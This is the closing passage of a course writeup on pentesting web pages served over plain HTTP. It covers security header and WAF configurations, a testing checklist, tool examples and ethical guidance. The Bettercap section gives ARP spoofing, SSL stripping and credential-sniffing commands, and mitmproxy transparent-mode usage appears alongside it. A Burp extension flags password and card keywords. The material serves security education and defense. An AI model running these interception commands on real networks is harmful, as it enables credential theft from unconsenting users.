# /etc/cron.d/https-monitor
# Daily check at 2 AM
0 2 * * * root /usr/bin/python3 /usr/local/bin/https-monitor.py
```


### 3. Security Headers Best Practices

**Comprehensive Security Headers**:

```apache
# Apache
Header always set Strict-Transport-Security "max-age=63072000; includeSubDomains; preload"
Header always set X-Content-Type-Options "nosniff"
Header always set X-Frame-Options "DENY"
Header always set X-XSS-Protection "1; mode=block"
Header always set Referrer-Policy "strict-origin-when-cross-origin"
Header always set Permissions-Policy "geolocation=(), microphone=(), camera=()"
Header always set Content-Security-Policy "default-src 'self'; script-src 'self' 'unsafe-inline'; style-src 'self' 'unsafe-inline';"
```

```nginx
# Nginx
add_header Strict-Transport-Security "max-age=63072000; includeSubDomains; preload" always;
add_header X-Content-Type-Options "nosniff" always;
add_header X-Frame-Options "DENY" always;
add_header X-XSS-Protection "1; mode=block" always;
add_header Referrer-Policy "strict-origin-when-cross-origin" always;
add_header Permissions-Policy "geolocation=(), microphone=(), camera=()" always;
add_header Content-Security-Policy "default-src 'self'; script-src 'self' 'unsafe-inline'; style-src 'self' 'unsafe-inline';" always;
```


### 4. Web Application Firewall (WAF) Rules

**Block HTTP Traffic to Sensitive Endpoints**:

```apache
# ModSecurity rules
SecRule REQUEST_URI "@rx (login|register|checkout|account|admin)" \
    "id:3001,phase:1,chain,msg:'Sensitive endpoint accessed over HTTP'"
SecRule REQUEST_SCHEME "!@streq https" \
    "deny,status:403,msg:'HTTPS required for sensitive endpoints'"
```

**AWS WAF Rule**:

```json
{
  "Name": "EnforceHTTPSOnSensitivePages",
  "Priority": 4,
  "Statement": {
    "AndStatement": {
      "Statements": [
        {
          "ByteMatchStatement": {
            "FieldToMatch": {
              "UriPath": {}
            },
            "TextTransformations": [{"Priority": 0, "Type": "LOWERCASE"}],
            "PositionalConstraint": "CONTAINS",
            "SearchString": "/register"
          }
        },
        {
          "NotStatement": {
            "Statement": {
              "ByteMatchStatement": {
                "FieldToMatch": {
                  "SingleHeader": {"Name": "x-forwarded-proto"}
                },
                "TextTransformations": [{"Priority": 0, "Type": "NONE"}],
                "PositionalConstraint": "EXACTLY",
                "SearchString": "https"
              }
            }
          }
        }
      ]
    }
  },
  "Action": {
    "Block": {}
  }
}
```


***

## üìä Pentester's HTTP/HTTPS Security Assessment Checklist

**Reconnaissance Phase**:

- [ ] Execute primary HTTP detection Google Dork
- [ ] Search for forms served over HTTP
- [ ] Identify authentication pages without HTTPS
- [ ] Look for payment/checkout pages over HTTP
- [ ] Enumerate API endpoints without encryption
- [ ] Check all subdomains for HTTP-only access

**Analysis Phase**:

- [ ] Document all discovered HTTP pages
- [ ] Identify sensitive data fields on HTTP forms
- [ ] Test for HTTP to HTTPS redirects
- [ ] Verify HSTS header presence
- [ ] Check for mixed content issues
- [ ] Analyze SSL/TLS configuration

**Exploitation Phase**:

- [ ] Demonstrate packet capture of form submission
- [ ] Extract credentials from HTTP traffic
- [ ] Test man-in-the-middle attack feasibility
- [ ] Verify SSL stripping vulnerability
- [ ] Document browser security warnings

**Reporting Phase**:

- [ ] Calculate CVSS scores for each HTTP finding
- [ ] Provide packet capture evidence
- [ ] Document regulatory compliance violations
- [ ] Include screenshots of browser warnings
- [ ] Write comprehensive HTTPS migration plan

***

## üß∞ Tools for HTTP/HTTPS Security Testing

### 1. SSLyze - SSL/TLS Configuration Scanner

```bash
# Installation
pip3 install sslyze

# Comprehensive scan
sslyze --regular target.com

# Specific checks
sslyze --certinfo target.com
sslyze --tlsv1_2 target.com
sslyze --http_headers target.com

# JSON output for automation
sslyze --json_out=results.json target.com
```


### 2. Bettercap - MITM Attack Framework

```bash
# Installation
sudo apt-get install bettercap

# Start bettercap
sudo bettercap -iface eth0

# Enable HTTP transparent proxy
> set http.proxy.sslstrip true
> http.proxy on

# Enable ARP spoofing
> set arp.spoof.targets 192.168.1.100
> arp.spoof on

# Capture credentials
> net.sniff on
```


### 3. mitmproxy - Interactive MITM Proxy

```bash
# Installation
pip3 install mitmproxy

# Start mitmproxy
mitmproxy

# SSL stripping mode
mitmproxy --mode transparent --ssl-insecure

# Save captured traffic
mitmproxy -w captured_traffic.mitm
```


### 4. Burp Suite Extension - HTTP/HTTPS Detector

```python
# burp-https-checker.py
from burp import IBurpExtender, IHttpListener

class BurpExtender(IBurpExtender, IHttpListener):
    def registerExtenderCallbacks(self, callbacks):
        self._callbacks = callbacks
        self._helpers = callbacks.getHelpers()
        callbacks.setExtensionName("HTTP/HTTPS Checker")
        callbacks.registerHttpListener(self)
    
    def processHttpMessage(self, toolFlag, messageIsRequest, messageInfo):
        if messageIsRequest:
            request_info = self._helpers.analyzeRequest(messageInfo)
            url = request_info.getUrl()
            
            # Check if HTTP
            if url.getProtocol() == "http":
                self._callbacks.issueAlert(
                    f"HTTP Request Detected: {url.toString()}"
                )
                
                # Check for sensitive data in request
                request = messageInfo.getRequest()
                request_string = self._helpers.bytesToString(request)
                
                sensitive_keywords = ['password', 'passwd', 'creditcard', 'ssn']
                
                for keyword in sensitive_keywords:
                    if keyword in request_string.lower():
                        self._callbacks.issueAlert(
                            f"CRITICAL: Sensitive data ({keyword}) sent over HTTP: {url.toString()}"
                        )
```


***

## üìö Additional Resources

| **Resource** | **Description** | **URL** |
| :-- | :-- | :-- |
| Cloudflare Learning | HTTP vs HTTPS Explanation | cloudflare.com/learning/ssl/why-is-http-not-secure/  |
| OWASP Testing Guide | Unencrypted Channel Testing | owasp.org/www-project-web-security-testing-guide/  |
| Mozilla SSL Config Generator | SSL/TLS Configuration Tool | ssl-config.mozilla.org/ |
| SSL Labs | SSL/TLS Server Test | ssllabs.com/ssltest/ |
| HSTS Preload | Chrome HSTS Preload List | hstspreload.org/  |


***

## üéì Key Takeaways for Penetration Testers

### Why HTTP/HTTPS Detection is Critical

1. **Widespread Impact**: Single misconfiguration exposes all users
2. **Easy Exploitation**: No special tools required for credential theft
3. **Compliance Violations**: GDPR, PCI DSS, HIPAA all require encryption
4. **Common Finding**: Many legacy applications still use HTTP

### How to Use in Engagements

**Black Box Testing**:

- Start with HTTP/HTTPS enumeration
- Document all unencrypted sensitive transactions
- Demonstrate MITM attack feasibility

**Internal Network Assessments**:

- Test for SSL stripping on corporate networks
- Verify internal applications use HTTPS
- Check for mixed content on intranet sites

**Compliance Audits**:

- Document HTTP usage for PCI DSS assessments
- Verify HTTPS on all PII-handling pages
- Test HSTS implementation


### What Makes a Strong Finding

Your penetration test report should include:

1. **Discovery Method**: Google Dork query used
2. **Visual Evidence**: Browser security warnings screenshot
3. **Packet Capture**: Plaintext credentials in network traffic
4. **Impact Demonstration**: MITM attack simulation
5. **Compliance Mapping**: GDPR/PCI DSS violations
6. **CVSS Scoring**: Typically 7.0-7.5 (High)
7. **Migration Plan**: Step-by-step HTTPS implementation

***

## ‚öñÔ∏è Ethical and Legal Considerations

**Authorization Requirements**:

- Google Dorking public HTTP pages is legal
- Active MITM attacks require explicit written authorization
- Packet capture requires permission and proper scope definition
- Never intercept traffic on networks you don't own

**Responsible Testing**:

- Only demonstrate exploitability, don't exfiltrate real user data
- Use test accounts for form submission demonstrations
- Document findings immediately to enable rapid remediation
- Follow coordinated disclosure for critical findings

**Professional Standards**:

- Test only authorized systems within defined scope
- Maintain audit trail of all testing activities
- Secure all captured credentials and packet captures
- Adhere to industry certifications (OSCP, CEH, PNPT, GPEN)

***

## üèÅ Conclusion

This demonstration illustrates a fundamental but critical security vulnerability: the transmission of sensitive data over unencrypted HTTP connections. Through simple Google Dorking, an insecure registration form was discovered collecting names, emails, phone numbers, and passwords over plaintext HTTP. The lack of encryption enables trivial credential interception through man-in-the-middle attacks on any network segment between client and server.

For penetration testers, HTTP/HTTPS security assessment provides:

- **Clear Security Impact**: Demonstrable credential interception
- **Universal Applicability**: Affects all HTTP users, not just specific scenarios
- **Compliance Leverage**: Regulatory violations strengthen remediation urgency
- **Simple Exploitation**: No complex attack chains required

The systematic methodology documented in this writeup‚Äîfrom HTTP page discovery through traffic interception demonstration‚Äîrepresents essential security assessment practice. Organizations must implement HTTPS across all pages, especially those handling authentication or PII, enforce HTTPS with HSTS headers, and continuously monitor for protocol downgrades.

**Critical Lesson**: In 2025, there is NO acceptable use case for HTTP on pages handling sensitive data. HTTPS is mandatory, not optional.

***

## üìù Appendix: Testing Evidence

### Screenshot 1: Google Dork Query

** - Shows the `-inurl:https` query for HTTP page discovery

### Screenshot 2: Discovered HTTP Registration Form

** - Browser showing insecure HTTP page with crossed-out padlock

### Screenshot 3: Sensitive Form Fields

** - HTML form collecting name, email, phone, password over HTTP

### Screenshot 4: Packet Capture

** - Wireshark capture showing plaintext credentials in HTTP POST request

***

---

## üìù About This Documentation

**Practical Testing Performed By**: Muhammad Izaz Haider

**Course**: EC-Council's Short Course - *Web Application Security Testing with Google Hacking*

**Purpose**: This documentation demonstrates the practical application of Google Dorking techniques learned during the course, transforming theoretical knowledge into hands-on security testing methodologies.

---

*This writeup is intended for educational purposes and authorized security testing only. Unauthorized testing of systems you don't own or have explicit permission to test is illegal.*
